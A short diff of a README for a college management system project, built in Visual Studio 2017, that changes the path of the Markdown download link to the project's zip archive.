@@ -1,6 +1,6 @@
 # College Management System Project
 
-## [Download](https://raw.githubusercontent.com/bhupendpatil/CollegeERP/raw/RAW/CollegeERP.zip)
+## [Download](https://raw.githubusercontent.com/bhupendpatil/CollegeERP/raw/raw/RAW/CollegeERP.zip)
 
 Made project in Visual Studio 2017
 
